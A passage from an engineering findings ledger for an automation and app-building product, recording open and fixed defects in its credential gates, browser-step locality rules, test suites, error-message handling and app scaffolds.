# Findings ledger

The live findings ledger: OPEN first, then recently fixed, then accepted/by-design. A finding closes
only by a landed fix + committed test, or a written dismissal. Replaces the release FINDINGS table and
the RUN_LOG finding tail. Journey findings keep their `F` ids; later findings use readable slugs.

## OPEN

- **`resolve-step-origin-runs-twice-per-gated-browser-step`** (**FIXED 2026-08-19**, round seven;
  see the round-seven fixed section). The walk still runs two to three times per gated browser step -
  that is inherent to resolving locality before the gate and re-resolving after it - but its
  DEFINITION-STORE READS are now memoised per `(integrationKey, actionName)` for the life of the run
  (`engine.ts` `loadDeclarationOnce`), and the same memo is handed to the credential gate. The
  warning in the original entry stands and was followed: the memo is keyed by the LOOKUP, never by
  the step, so nothing resolved for one step is reused for another.

- **`the-permit-is-withheld-where-the-old-shape-would-have-typed-from-the-datacenter`** (OPEN
  2026-08-19, LOW, an intended behaviour change with a real cost, recorded so it is not rediscovered
  as a bug). `hostedTypistPermitFor` withholds the hosted typist entirely when a step required a
  residential line and the connected machine cannot lend one - a step pinned to a machine that does
  not advertise `egress.residential`, which is an ordinary fleet shape since that capability is about
  lending a line to others and most machines never grant it. Such a run now halts
  `needs_credentials` asking for a person where it previously logged in from the datacenter and
  carried on. That is the intended direction (the login was leaving by a different door than the work
  and the portal was being shown two identities for one account), and the halt is a state the product
  already surfaces and a person can act on. **The cost is availability**: an owner whose automation
  used to run unattended now gets a ceremony ask, and the message they see is the generic
  needs-credentials one rather than "your machine cannot lend the login a matching line". A refusal
  that named its own cause would need the permit to carry a reason through the gate into the halt
  payload; not done here, because the payload is a contract shape and widening it is its own slice.

- **`retired-ceremony-halt-cannot-name-the-machine-in-the-fleet's-own-words`** (OPEN 2026-08-19,
  LOW, an honest limit of the message). The retirement halt says "the machine where this session was
  established has been removed from your account - establish this session again, from a machine you
  still have", which names the machine by ROLE and deliberately never prints the pairing UUID (an
  opaque identifier no surface in this product shows a user; the message and the persisted
  `credentialRequest.reason` are both asserted not to contain it).

  **What it cannot do is name it by LABEL**, because there is none to read. `PairingRow`
  (`bridge/registry.ts`) carries `pairingId`, `org`, `ownerUserId`, capabilities and an egress
  endpoint - no device name - and the retired pairing is by definition absent from the fleet listing
  the engine consults, so even a label field would need a separate lookup of a revoked row.
  `locality.ts` is also PURE by construction (no store, no seam, no env), which is what makes its
  whole decision table drivable from a test, so the lookup could not live there. Closing this means
  a device name on the pairing record plus a seam the engine can ask - worth doing when the fleet
  surface grows one, not worth a store read on a refusal path today.

  2026-08-19 (round five): the same halt gained a SECOND producer, `credentialGateRecord` in
  `engine.ts`, which unlike `locality.ts` does hold the fleet listing. It did not change this: a
  retired pairing is absent from that listing by definition, so there is still no row to read a label
  off.
  2026-08-19 (round six): back to ONE producer. `locality.ts`'s copy of the refusal was unreachable
  in production and has been removed, and `SESSION_MACHINE_RETIRED_REASON` now lives in
  `egress-policy.ts` beside `machineRetired`. Closing this is still a single edit.

- **`suite-ledger-unit-census-drifted-red-again`** (2026-08-19, **census half FIXED 2026-08-19**;
  the CI-lane half remains OPEN, LOW, gate rot). `npm run gate:ledger` exited 1 on
  `[FAIL] unit census mismatch`.
  **CORRECTION, 2026-08-19.** The first version of this entry said "disk 64 != ledger 59" and listed
  FIVE offenders, and stated the red was not caused by the branch that found it. Both halves were
  right when written and the count went stale the moment this branch's own round three landed
  `web/__tests__/components/run-status-badge.test.tsx` (commit 6e2096a) without a ledger row: the
  real figure on `feat/p4-locality` was **disk 65 vs ledger 59**, and the sixth offender WAS this
  branch's. Registering it here is what the same-change rule required of round three.
  All six are now in `frontend_unit.surviving` and the census reads `65 (ledger: 65)`. Five were
  genuinely pre-existing and are on `main`: `automations-needs-credentials` (commit 55572ee) and
  `components/schedule-detail-page`, `components/schedule-form-error`, `components/schedules-page`,
  `lib/schedules-authority` (commit f6b5233). The sixth is `components/run-status-badge`.
  **WHAT IS STILL OPEN.** `npm run gate:ledger` still exits 1, on a DIFFERENT line:
  `[FAIL] N artifact(s) are due at G12 but --run was not passed`. That is structural to the bare
  invocation - the script only reports due artifacts green when handed `--run`, which shells out to
  Playwright and the node drivers - and it is identical on `main`. The census line, which is the
  half that carries information about drift, is the half this closes.
  This was the THIRD occurrence of the identical drift (`suite-ledger-unit-census-drifted-red`,
  FIXED 2026-08-05, was the first). It keeps recurring because `gate:ledger` is not in
  `npm run ci:lane`, so nothing forces the entry at merge.
  CLOSE THE REST BY: deciding whether a lane-runnable census-only mode (`--census`) goes into
  `ci:lane`, or recording in `docs/decisions.md` why a gate nothing runs is worth keeping. Not done
  here: adding a gate that boots Playwright and the drivers to the per-PR lane is a CI decision with
  its own blast radius and is out of this branch's scope.

- **`a-machine-halt-on-an-integration-step-is-reported-as-awaiting-integration`** (2026-08-19, OPEN,
  MEDIUM, wrong halt copy + ceiling accounting - found while repairing the P4.2 fixtures, **not
  caused by this branch**: the ordering is on `main` and predates locality). The engine's halt
  cascade (`api/src/automation/engine.ts`) reads, in order, `needs_credentials`, then a BLANKET
  `record.error?.recoverable === false && step.type === 'integration'` -> `awaiting_integration`,
  and only THEN the `awaiting_daemon` detail. So a gated INTEGRATION step whose credential gate
  answers `needs-machine` - "your session is fine, the machine it is bound to is asleep" - is
  reported as `awaiting_integration` and the user is told to go connect an integration that is
  working. Two consequences: the copy names the wrong thing, and `awaiting_integration` is NOT in
  `NEUTRAL_BLOCKED_CODES` (`api/src/schedules/supervisor.ts`, which holds `awaiting_daemon` alone),
  so a schedule waiting on a laptop burns its failure ceiling and auto-pauses instead of waiting.
  More reachable after this branch, which is why it was found here: before the run loop supplied
  `residentialAvailable`, every attended session refused at checkout regardless of step type.
  CONSEQUENCE IF NOT CLOSED: a user whose ceremony laptop is switched off is sent to their
  integrations page, and their schedule pauses itself for a condition that would have cleared on its
  own. CLOSE BY: reading the `awaiting_daemon` detail BEFORE the integration-type blanket, so the
  detail a step actually carries outranks a guess made from its type. Not done here: it changes what
  every integration step reports and needs its own suite over the cascade.
  WORKED AROUND IN TESTS: `api/tests/automation/engine-locality.test.ts` gates a `navigate` step
  rather than the `integration` step wherever it asserts a machine halt, with the reason stated at
  the fixture (`portalBThenGatedA`).

- **`f5-crawl-specs-race-the-background-runner`** (2026-08-19, OPEN, MEDIUM, test-estate - found by
  the api contract lane going red on a loaded box while closing
  `artifact-family-test-leaks-watchers`; **NOT caused by that work**, proven below). Two specs in
  `api/tests/contract/f5-ui-endpoints.test.ts` fail under CPU load and pass on an idle box:

  1. *"a second POST while one is in flight answers alreadyRunning:true"* - `expected true to be
     false`. It fires POST #1 without awaiting it, then POST #2. The crawl it starts fails
     immediately (`Blocked host: 127.0.0.1`, no network by design), so on a loaded event loop run
     #1 has already SETTLED before request #2 is even issued, and #2 legitimately starts a new run.
     Nothing pins the "in flight" precondition the spec's name asserts.
  2. *"GET /sources/:id/crawl ... no run yet: running:false, no progress"* - `expected {…} to be
     undefined`, with a `startedAt` from the PREVIOUS spec. `runner.ts`'s `state.done` `finally`
     does `lastProgress.set(sourceId, finalProgress)`; spec 1 awaits only the HTTP response, never
     the background run, so that write lands AFTER the next `beforeEach` calls
     `__resetCrawlRunnerForTests()` and repopulates the map the reset just cleared.

  **Attribution, measured rather than assumed.** With 24 busy worker threads pinning the CPU,
  `npx vitest run tests/contract/f5-ui-endpoints.test.ts` fails **identically on `main`'s
  unmodified `app-registry.ts`** (2 failed / 16 passed) and on the watcher-collapse branch
  (1-2 failed / 16-17 passed). Idle, both are green (18 passed). The suite touches no app-registry
  path; the shared cause is the crawl runner's un-awaited background task.

  **Why it is worth a row rather than a shrug:** this is the same failure MODE the corrected
  `artifact-family-test-leaks-watchers` entry is about - a lane that goes red for a reason unrelated
  to the change under test trains people to discount its exit code. It is load-sensitive and this
  box routinely runs several agent sessions at once: observed firing in a full-lane run at load
  average ~11 and in an isolated run under 24 busy threads, while an idle full lane at 02:38 the
  same night was 61/61 green. Expect it to recur, and expect it to be blamed on whatever change
  happens to be in the tree.

  **It recurred, exactly as predicted, in the P4 round-five lane (2026-08-19).** The full api
  workspace ran 4895 passed / 1 failed / 2 skipped over 383 files, and the one failure was spec 1
  above. Re-measured immediately afterwards: the same file alone on the round-five tree passed
  18/18 three times in a row, and passed 18/18 on the same branch with the round-five changes
  STASHED - i.e. green both with and without the change, red only under contention. The changed
  files that lane carries are all `api/src/automation/**`, which the crawl endpoints do not reach.
  Recording the measurement rather than the reassurance, because the entry's own prediction is that
  the next author will be told this is theirs.

  **CLOSE BY** (left undone here only because this branch's scope is `api/src/apps/**`): give the
  suite an `afterEach` that does `await cancelCrawlAndWait('s1')` before the runner reset, so no
  background run can write after the clear; and make spec 1's precondition real - hold run #1 open
  with a lookup seam that does not resolve until the spec releases it - instead of racing it.
- **`citius-sync-establishes-its-session-outside-the-locality-decision`** (**PERMIT HALF FIXED
  2026-08-19**, round six; what remains is OPEN, MEDIUM). P4.1 makes the unattended typist's hosted
  browser conditional on a PERMIT the run loop issues only for an origin whose posture allows the
  hosted path (`EnsureSessionInput.hostedTypist`, absent-means-no). The Citius sync rail
  (`routes/sync.ts` -> `legal/citius-sync.ts`) calls `ensureSession` DIRECTLY, and it briefly wrote
  `hostedTypist: {}` into that call unconditionally - an exemption from a rule everything else obeys
  (Capability Contract rule 3), on the one rail that drives a court portal with a lawyer's
  credential.

  **FIXED.** The permit is now an INPUT (`CitiusSyncInput.hostedTypist`) composed at the rail's
  composition point from `classifyOrigin`, exactly as the run loop composes it. The rail decides
  nothing; it forwards. With no `IntegrationAction` declaring the Citius host permissive, the answer
  today is a permit WITHHELD, so no hosted browser opens and the route is `needs-human`. See the
  round-six fixed section.

  **WHAT IS STILL OPEN, and it is narrower than it was.** The rail has no posture DECLARATION to
  consult, so the closed default is the only answer it can ever give: a Citius session can only be
  established by a person, and the typist can never help, however the fleet or the origin changes.
  CLOSE BY: promoting the sync onto a declared integration action, at which point `classifyOrigin`
  reads a real posture and this becomes an ordinary yes-or-no.

  **THE FLEET HALF IS NOT A GAP - it is the correct closed answer, re-dispositioned 2026-08-19.**
  An earlier version of this entry said the rail "never supplies `residentialAvailable`" and should.
  It should not, and wiring it in would have been a defect. After establishment this rail does not
  drive a browser at all: it replays the captured session's cookies over SERVER-SIDE HTTP
  (`citius-mandatarios-http.ts`), from the datacenter, with no proxy seam anywhere in the path.
  Naming a residential machine would make `checkoutSession` RELEASE a session bound to that machine's
  line, which the rail would then replay from a datacenter IP - the exact vantage mismatch checkout
  exists to refuse, and worse than the `needs-egress` refusal it replaces because it succeeds
  silently. The refusal is the honest answer until the walk itself can leave by a machine. Pinned:
  the rail is asserted to pass no `residentialAvailable`, with the reason on the field's docblock.

- **`posture-drift-check-cannot-stop-the-act-that-navigates`** (OPEN 2026-08-19, MEDIUM, a named
  limit of the P4.1 posture-inheritance constraint). Posture is declared on an `IntegrationAction`
  and applies to the origin that action is about. A `browser`/`wait`/`verify` step has no URL, so
  `resolveStepOrigin` walks back to the nearest URL-bearing step - and only an `integration` step
  yields a non-null action, so a browser step can inherit `permissive` from an API origin and then
  be driven onto an unrelated host. The engine now refuses to carry the NEXT step when the hosted
  session's observed origin is not the declared one, which closes the compounding case.

  **It cannot close the first hop.** The act that navigates is the same act the step was authorised
  to perform, and the engine learns where it landed only from the post-action observation. A step
  that navigates to a bank portal and does its work in ONE act is unprotected by this check. The
  bridge is unaffected either way (there is no substitution to make on the owner's own machine); the
  exposure is hosted-only, and it needs a per-ACT origin gate inside the executor - i.e. refusing an
  act whose resolved destination leaves the declared origin - which is a different slice.

- **`blocked-badge-copy-is-keyed-on-codes-nothing-enumerates`** (OPEN 2026-08-19, LOW, drift risk).
  `schedules.runBlocked` in `web/locales/*` keys its copy by `detail.code`, and those codes are
  produced in `api/src/schedules/supervisor.ts` (`mapAutomationOutcome`, `mapIntegrationOutcome`)
  and `api/src/automation/service.ts` with no shared enumeration between them, and
  `ScheduleRun.detail.code` is a free `z.string().max(64)`. A new blocked cause added on the API
  side renders the vague fallback until someone remembers the locale keys, and nothing fails when
  they do not.
  `web/__tests__/components/run-status-badge.test.tsx` pins that the fallback is honest (never a
  specific wrong instruction) and that en/pt stay key-for-key, which bounds the damage; a shared
  code vocabulary in `shared/` would end it. Deliberately not added here: it is a contract change,
  and Rule 7 wants that decided on its own rather than as a tail of a UI fix.

- **`undeclared-origins-are-bridge-only-so-a-daemonless-dev-halts-browser-steps`** (OPEN 2026-08-19,
  MEDIUM, developer ergonomics - the deliberate cost of P4.1, recorded rather than hidden). Execution
  locality is now gated by the ORIGIN POSTURE in every environment, and posture defaults
  ADVERSARIAL. A `navigate` step states its own URL and carries no action, so `resolveStepOrigin`
  answers `action: null` for it and `classifyOrigin` returns the closed classification - which means
  a plain planner-authored `navigate`/`browser` automation is BRIDGE-ONLY. On a developer machine
  with no paired daemon those steps now halt in `awaiting_daemon` where they previously ran in the
  hosted Chromium, because `config.localBrowserEnabled` defaulted to `!isProd`.

  **This is the intended behaviour, not a regression to fix by loosening it.** The two escape routes
  are the two the design intends: pair a daemon (`clients/bridge`), or declare the action's posture
  (`IntegrationAction.posture: 'permissive'` with an `httpConfig.baseUrl` covering the origin). An
  env override that reopened the hosted browser for an adversarial origin was considered and
  REFUSED in `docs/decisions.md` (2026-08-19): it is the same defect wearing a different variable
  name, and it would give `adversarial + cloud egress` a representation that
  `origin-posture.ts`'s frozen constructor exists to make impossible.

  **What is genuinely open** is the ergonomics, not the policy: there is no way today to declare a
  posture for a bare `navigate` step's origin, because posture lives on `IntegrationAction` and a
  navigate step has no action. Adding one to `StepDeclaration` would be wrong - the step is
  MODEL-AUTHORED, so the authorised artefact and the authorising artefact would be the same file,
  which is exactly the hole the deletion of `declaredOrigins` closed. The likely right answer is a
  tenant-scoped, human-authored origin posture list resolved through the same seam, and it is not
  built. Until it is, dev drives browser automations through a paired daemon.

- **`daemon-seam-cannot-ask-for-a-specific-machine-so-the-ceremony-preference-can-refuse-spuriously`**
  (OPEN 2026-08-19, MEDIUM, availability - a named limitation of P4.2, not a silent one).
  `automation/seams.ts` `getDaemonConnection(ownerUserId)` is bound to `bridge/registry.ts`
  `getConnectionByOwner`, which answers "the NEWEST live socket for this owner" and cannot be asked
  for a particular one. P4.2 gives an adversarial session a preference for the pairing its ceremony
  happened on, and `locality.ts` honours it by REFUSING a connected machine that is not it. For a
  user with one machine that is exactly right. For a user with two, the run halts whenever the
  arbitrary pick is the other one - even though the preferred machine is online and dialled in.

  **The primitive that fixes it already exists and is INERT**, which is how this slice found it:
  `bridge/registry.ts` `selectConnectionForStep` implements `pinned | any:<capability> | cloud`
  selection with the org and owner checks, is fully covered by
  `api/tests/security/step-declaration-routing.test.ts`, and has NO production caller - the same
  shape `egress-policy.ts` was in before P4.1. Closing this means widening the daemon seam to
  `(ownerUserId, preferred?: { pairingId, orgId })` and binding it to `selectConnectionForStep`
  with `target: { kind: 'pinned' }`, plus deciding whether the run's connection may be re-resolved
  mid-run (it is captured once today, and a `DaemonBrowserSession` binds it at construction).

  **Deliberately not done here.** It changes which machine executes a step, which is a
  security-relevant routing surface that deserves its own slice and its own suite rather than a
  tail-end addition to one already touching the engine, the schedules rail and `shared/`. The
  failure direction is the safe one meanwhile: the run HALTS naming the machine it wants, rather
  than silently executing on a different one.

- **`schedule-blocked-notification-has-no-client-consumer`** (OPEN 2026-08-19, LOW, half-wired
  surface). P4.1 emits an additive `schedule_blocked` NotificationEvent on the per-user
  notifications channel when a scheduled fire halts waiting for its owner, and
  `ScheduleSupervisorDeps.notifyBlocked` is required so the rail cannot boot half-wired. NOTHING IN
  `web/` LISTENS FOR IT YET: `header.tsx` subscribes to `usage_updated` only, so today the event
  lands in the stream and is dropped. The durable record (the `blocked` schedule run row, already
  rendered by the schedules surface) is unaffected, so nothing is lost - but the notification is not
  yet a user-visible improvement, and claiming the owner "is told" is true only of the wire. Closing
  it means a client subscription plus the pt/en strings derived from the CODE (never server prose).
  Scoped out of P4 deliberately: it is a web slice, and this one is api-side.

- **`workspace-scoped-verification-misses-two-workspaces`** (2026-08-18, OPEN as a PROCESS gap; the
  two red pins it hid are FIXED). Twice now a change has grown the public surface, left a pin red,
  and been declared green by a reviewer who ran `npm test --workspace api` and
  `npm test --workspace web` rather than root `npm test`. The root script fans out to FIVE
  workspaces; `shared` and `clients/cortex-cli` were never executed.

  **Measured, on `main` after the schedules landing:** `shared/src/contract.test.ts` red
  (`expected 33 to be 32` - the descriptor-map pin) and `clients/cortex-cli/tests/client.test.ts`
  red (`expected [ ...(41) ] to have a length of 31` - the public-operation pin). Both had been red
  since `5a5e721`, through the review gate, the fix round, and a push to origin. Repaired in
  `3c44bcf` and `adb007e`.

  **This is the SECOND occurrence of the shared pin specifically** - `contract.test.ts`'s own
  comment already records `appEmail`/`appVision` landing without bumping it (2026-08-06, repaired
  2026-08-07). A defect that recurs on the same file with the same cause is a process gap, not an
  oversight.

  **Why the other gates did not catch it, and why that is correct.** `gate:client-drift` was green
  the whole time, and rightly so: drift proves the GENERATED client matches the spec, which it did.
  The pin proves a HUMAN noticed the public surface grew. They answer different questions and
  neither substitutes for the other - which is exactly why the pin has to actually run.

  **Closes when:** the verification habit is structural rather than remembered - either every
  "is it green" claim runs root `npm test`, or the two pins move into a lane that the api/web
  runs cannot skip. Until then, treat any green claim scoped to a workspace as unproven for the
  other three.

- **`browser-step-retry-may-double-fire`** (2026-08-18, OPEN, self-reported by the slice that
  introduced it - the automation budgets/primitives work, `ca43335`). The new deterministic
  per-step retry (`STEP_RETRY_BUDGET.deterministicRetries`, `engine.ts:1568-1600`) re-issues the
  SAME cached DOM action after a runtime failure. A browser step can fail having PARTIALLY
  succeeded - a click that landed and then threw while waiting for navigation - so a
  non-idempotent browser step (submit, confirm, pay) could fire twice.

  **This is not a new class of failure.** The old path reached the same place: on a cache failure
  it fell through to vision, which typically re-resolved to the same click and acted again. What
  changed is the COST of getting there - the retry is now cheap and unconditional where the vision
  path was expensive and occasionally resolved elsewhere. So the risk is pre-existing but is now
  materially easier to hit.

  **Why it is open rather than fixed here.** There is no consent gate on `browser` steps the way
  there is on `api_call` (`action-executor.ts` refuses `awaiting_consent` before any credential
  load; a DOM click has no equivalent). Closing this properly means deciding what makes a browser
  step non-idempotent - and the honest answer is that the engine cannot know from a locator alone.
  Plan trap T4 already covers replay idempotency for INJECTED CALLS via `InjectedCall.idempotent`
  (P2.3), where the HTTP method makes the answer structural. The browser-step case wants the same
  treatment and should land with P2.3 or P4, not as a guessed heuristic here.

  **Closes when:** a browser step carries an idempotence verdict the retry consults, of the class
  `InjectedCall.idempotent`, with a test proving a non-idempotent step is not silently re-issued.

- **`verify-step-vision-fallthrough-uncounted`** (2026-08-18, OPEN, scoped out deliberately).
  `executeVerifyStep` has its own assertion-cache to vision fallthrough that remains UNCOUNTED,
  while the browser-step fallthrough is now bounded by `STEP_RETRY_BUDGET.visionRegroundsPerStep`.
  The budgets work deliberately did not widen its blast radius across a 2300-line central file.
  Small and self-contained; closes by threading the same `createStepRetryLedger` through the verify
  path with a spec of the same shape.

- **`knowledge-fts-heal-scan-unscoped`** (2026-08-11, OPEN, found by a full api-suite run during
  the `run-error-text-leak` work; NOT caused by it). `api/tests/security/knowledge-scoping.test.ts`
  ("grep gate: every CONTENT-bearing knowledge_fts query filters on orgId") fails
  **deterministically, in isolation** on `main` at 922749c. The hit is
  `api/src/knowledge/index-store.ts:170`, in `healDocMap`:
  `SELECT rowid, orgId, collection, docId, title, createdAt, sourceUrl, sourceType, language FROM
  knowledge_fts` - a whole-table scan selecting `title`, with no orgId predicate. The gate's own
  comment still asserts the only org-agnostic statements are `COUNT(*)` counters "neither of which
  reads text"; the doc-map heal now denormalizes `title`, so that stated assumption no longer holds.

  **Assessment: a false positive on the letter of the rule, not a tenancy hole - but the gate is
  right to be red.** `healDocMap` is derived-data self-heal: it reads every fts row and writes each
  one back into `knowledge_doc_map` **under that row's own `orgId`** (`ins.run(r.orgId, ...)`). It
  serves nothing to a caller and mixes no orgs, so no content crosses a tenant boundary. What is
  broken is the invariant's *statement*: "content-bearing query" no longer distinguishes a
  maintenance scan from a serve path.

  **FIXED 2026-08-13** (this ledger entry kept in place for the history of the deferral): the
  2026-08-11 deferral cited another session's in-flight knowledge/crawl work, which has since
  landed (922749c is on `main`), so resolution **(b)** was taken during the assistant-overhaul
  batch that was already editing `index-store.ts`: `healDocMap` now rebuilds the doc-map PER-ORG
  (`SELECT DISTINCT orgId` - ids only, no content - then `WHERE orgId = ?` per partition), so
  every content-bearing fts read carries an orgId predicate with no gate carve-out, and the heal's
  working set is bounded to one partition at a time instead of the whole 200k+-row shared corpus.
  The gate (`api/tests/security/knowledge-scoping.test.ts`) and the heal-behavior tests
  (`api/tests/knowledge/index-store.test.ts`) are both green; the regex was not touched.

- **`run-error-text-leak`** (2026-08-10, **CRITICAL**, found live by the owner on the dev stack;
  FIXED 2026-08-11). A user asked the agent, in Portuguese, `faz um site a falar das apps
  juridicas do ekoa`. The reply rendered in the agent's own message bubble was:

  > *credential expired and refresh failed: OAuth refresh not configured (LLM_OAUTH_REFRESH_URL +
  > stored refresh token required)*

  Two independent defects, both production-blocking. Owner's framing: "a user gets this once its
  game over".

  **Defect 1 - internal error text reached the user.** `getSecret()` threw a `CredentialError`
  naming the missing env var; it propagated out of `runAgent`; `agents/chat.ts`'s catch-all did
  `finishError('ADAPTER_ERROR', err.message)`, putting the exception text on the wire; the web's
  guard (`web/lib/sanitize-error.ts`) was a DENYLIST of provider-leak substrings that the string
  matched none of, so it rendered verbatim - styled `type: 'status'`, i.e. as a considered remark
  by the agent rather than a failure. Two more sites of the same class were found by audit:
  `build.ts` streamed `progress.reasons` (gate diagnostics) on `BUILD_UNFULFILLED`, and streamed
  the verifier's MODEL-DERIVED `verdict.note` on `VERIFY_FAILED` - the very PII vector `jobView`'s
  `SAFE_ERROR_MESSAGE` map was written to block on the polled view, left open on the live stream.

  **Root cause is structural, not a missing denylist entry.** The wire's `message` was a free
  string, so "don't leak" depended on every producer remembering. A denylist fails OPEN for every
  internal string nobody enumerated - which is every future one. It was also believed to be
  someone else's job: `events/sse-manager.ts`'s header claimed "the egress error sanitizer is
  applied at the event serializer (ch09 invariant 2)" and it never was - `emit`/`writeFrame` do a
  bare `JSON.stringify`. That comment read as a safety net that did not exist; corrected in place.

  **A 58-agent audit sweep found six more sites of the same class**, all fixed here:
  `build.ts`'s COMPLETE event embedded raw esbuild diagnostics (`bundle.error` =
  `result.errors.join('; ')`, carrying sandbox file paths) in the user's completion summary;
  `automation/engine.ts` put a raw step failure (`record.error?.message`) into the run's terminal
  headline at two call sites; `routes/artifacts.ts` passed a thrown backup-store message into a
  `NOT_FOUND` envelope; `agents/integration-agent.ts` returned `outcome.cause.message` into the
  envelope the builder UI renders; and `web/hooks/useAgentExecution.ts` rendered
  `` `Error: ${error.message}` `` from a client-side throw straight into the transcript.

  **Fix.** User-facing text is now DERIVED FROM A CODE and never carried as prose.
  `shared/src/run-errors.ts` holds the terminal vocabulary (`RunErrorCode`), the pt/en text, and
  `RUN_ERROR_RETRYABLE`; it is the one definition both sides use (FIXED-1 safe - `shared/` imports
  nothing). The sinks (`agents/streaming.ts`) take a CODE, never a message, and fill the wire text
  from that table, so a producer *cannot* pass prose - the type system refuses it. Catch-alls
  classify structurally via `agents/run-failure.ts` (`CredentialError` -> `AUTH_ERROR`, rate cap ->
  `RATE_LIMITED`, ...) instead of echoing, and log the honest cause with the run id. The web
  renders `runErrorMessage(code, locale, params)` and never `event.message`; an unknown code
  degrades to `UNKNOWN`'s branded text. The billing URL moved from concatenated prose to a
  structured `params.billingUrl` on the event. `jobView` now reads the same shared table instead of
  its own private map, so the polled view and the live stream cannot disagree. The failed turn also
  renders as an ERROR (was `status`) and offers Retry when `RUN_ERROR_RETRYABLE` says retrying can
  help - the user's message is preserved and re-sent, so a failure is no longer a dead end.
  Deliberately kept: `sanitizeUserFacingError`, as defence in depth for the paths that genuinely
  have only a string, hardened with credential/plumbing needles.

  **Defect 2 - OAuth refresh never worked anywhere.** `defaultRefresh` required
  `LLM_OAUTH_REFRESH_URL`, which no environment ever set, and *no* provisioning path
  (`provision-credential.mjs`, `rearm-credential.mjs`, `dev-credential.mjs`) sent the
  `refreshToken`/`expiresAt` the contract already accepted - `scripts/dev-credential.mjs` held a
  working refresh pair on disk and dropped both at the POST boundary. So every oauth credential was
  a time bomb: fine until expiry, then every chat and build run failed until a human re-armed by
  hand. The original comment called the unset default "the correct fail-closed posture"; fail-closed
  is right for authorisation, not for a self-heal path whose absence takes the product down.
  **Fix.** The token endpoint and client id are defaulted to the public subscription values (the
  same ones `dev-credential.mjs` has been refreshing against successfully all along), overridable
  via `LLM_OAUTH_TOKEN_URL` / `LLM_OAUTH_CLIENT_ID`; the JSON-then-form request shape mirrors that
  script so the two cannot drift. All three provisioners now carry `refreshToken` + `expiresAt`, and
  rotated refresh tokens are persisted. An unrefreshable oauth credential is warned about at load
  and at provision time (`[llm][claudeAuth] WARNING: oauth credential stored WITHOUT a refresh
  token`) rather than discovered hours later by a user.

  **Tests.** `shared/src/run-errors.test.ts` (vocabulary exhaustiveness; a forbidden-substring sweep
  proving no code's copy in either locale can mention the engine, credentials, tokens or env vars;
  fail-closed normalization). `api/tests/agents/run-error-leak.test.ts` reproduces the exact
  production state through the REAL credential machinery - an expired credential plus a failing
  refresh seam, not a mocked throw - and pins `AUTH_ERROR` + zero internal substrings on any event,
  on the settled run record a reconnecting client polls, and no assistant message persisted;
  verified to FAIL against the pre-fix line. `web/__tests__/sanitize-error.test.ts` pins
  render-from-code and unknown-code fail-closed.

- **`base-template-consumption-gaps`** (2026-08-09, LOW-MEDIUM, found by a consumption-map audit
  during the impeccable-bases template pass; none are regressions - all predate the pass). Four
  distinct gaps in how `api/assets/bases/*` content is (not) consumed:
  1. **`recipes/` is orphaned content.** `base-loader.ts loadBase()` never reads `recipes/`; yet
     `app/instructions/base-conventions.md` rule 6 tells the build agent to use the `empty-state`
     recipe it never receives. Either inject recipes as prompt sections or drop the references.
     (The impeccable-bases pass mitigates the empty-state case specifically: the app scaffold's
     `index.css` now ships a crafted `.empty-state` implementation directly, and the base
     conventions describe it in-file.)
  2. **`app-auth-persistent` produces an unbuildable project if explicitly selected.** It has no
     `scaffold/`, only 4 wiring files, so `scaffold.ts` takes the template branch (files > 0),
     suppresses the generic starters, and the project has no `index.jsx`/`App.jsx`; its
     `mustEdit: ["frontend/src/App.jsx"]` then names a file that never exists, so
     `assertProgress` can never pass. Unreachable in practice (nothing sets `templateId` to it -
     `baseForType` never returns it), which is why it has not burned a user; still a landmine.
  3. **`app-integration-heavy` is a base in name only** (no scaffold, no wiring; degrades
     gracefully to generic starters + prompt sections). Same unreachability.
     Disposition for 2+3: fold both into the `app` base (delete, or give them real scaffolds)
     the next time base selection grows a second app flavour; until then they stay as prompt-only
     variants reachable only by explicit `templateId`.
  4. **`manifest.extends` is never validated against `BASE_IDS` on the import path**
     (`manifest.ts` accepts any non-empty string); an arbitrary value silently resolves to `null`
     base at `build-mechanics.ts resolveFollowUp`, i.e. base conventions vanish from follow-up
     builds with no signal. Needs a warn-or-fail decision at import time.

- **`landing-presentation-scaffold-zero-coverage`** (2026-08-09, FIXED same day). The `landing`
  and `presentation` scaffolds had no test reading them at all - a syntax error would ship
  silently and surface only as a live build failure. Fixed by the scaffold compile guard in
  `api/tests/apps/base-loader.test.ts` ("every scaffold-carrying base compiles through the real
  builder"): each base with a `scaffold/` is assembled via `baseProjectFiles` and bundled through
  the real `appBuilder` esbuild pipeline; the covered set is pinned to
  `app/document/landing/presentation` so a base gaining or losing its scaffold is a deliberate
  diff.

- **`featured-router-basename-missing`** (all 4 known instances FIXED 2026-08-08, MEDIUM, plus a
  standing regression guard added for the whole class - found chasing two "real broken state, not
  just empty data" screenshots the WS10 featured-artifact audit flagged: `booking-system` rendered
  a fully blank content pane (sidebar visible, body white); `sales-crm` rendered a "Página não
  encontrada" 404 instead of its dashboard). Reproduced from CURRENT source, not a stale
  screenshot ghost: built each scaffold with the real `appBuilder.build()` esbuild pipeline and
  served the dist under `/apps/<id>/` (the exact path prefix `serving.ts` mounts every artifact
  at), byte-identical `injectAppContext()` included. Both reproduced exactly as screenshotted;
  Playwright's console capture on `booking-system` even printed react-router's own diagnostic
  verbatim: `No routes matched location "/apps/booking-system/"`.
  ROOT CAUSE, systemic in the sense that it recurs (a scaffold-authoring omission, not a bug in
  the builder/serving/route-mounting layer itself - proven by the 29 `legal-*` scaffolds + `cobrancas`
  that all serve correctly through the exact same pipeline): every served artifact lives at
  `/apps/<id>/`, so `window.location.pathname` there is `/apps/<id>/...`, never bare `/`. A
  scaffold that mounts `<BrowserRouter>` with NO `basename` declares routes as absolute paths from
  the domain root (`/`, `/calendario`, `/contactos`, …) which then never match the actual served
  pathname. `injected-context.ts` even documents the trap inline (the `<base href>` comment: "react
  router uses its basename, not the DOM base") - the platform's own `<base>` tag fixes RELATIVE
  ASSET urls but does nothing for react-router's path matching, which reads
  `window.location.pathname` directly. The symptoms are the SAME defect wearing different costumes
  depending on whether the scaffold's own route table happens to declare a catch-all:
  `booking-system` has none, so `<Routes>` matched nothing and rendered `null` (blank content
  pane, sidebar chrome unaffected since `Shell` renders unconditionally around `{children}`);
  `sales-crm` has an explicit `<Route path="*" element={<NotFound/>}>`, so the mismatch rendered
  its own "Página não encontrada" empty-state instead of the dashboard; `ecommerce-catalog` and
  `invoice-manager` both redirect to `/` on an unmatched path (`<Route path="*" element={<Navigate
  to="/" replace/>}>`), which - THIS IS THE THIRD COSTUME, found while writing the regression
  guard below - does not print "no routes matched" at all: react-router instead warns `<Router
  basename="..."> is not able to match the URL "..." because it does not start with the basename,
  so the <Router> won't render anything`, a DIFFERENT diagnostic for the sub-case where the
